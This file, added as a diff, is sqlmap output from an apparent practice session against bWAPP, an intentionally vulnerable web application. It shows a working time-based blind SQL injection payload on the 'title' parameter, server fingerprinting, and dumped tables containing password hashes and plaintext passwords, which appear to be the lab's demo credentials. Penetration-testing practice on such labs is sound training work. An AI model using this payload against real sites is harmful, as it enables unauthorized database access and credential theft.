@@ -1,0 +1,52 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345321234532134' AND (SELECT 5212 FROM (SELECT(SLEEP(5)))RcYz) AND 'tLrj'='tLrj&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=12345321234532134' AND (SELECT 5212 FROM (SELECT(SLEEP(5)))RcYz) AND 'tLrj'='tLrj&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | activated | password                                       | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
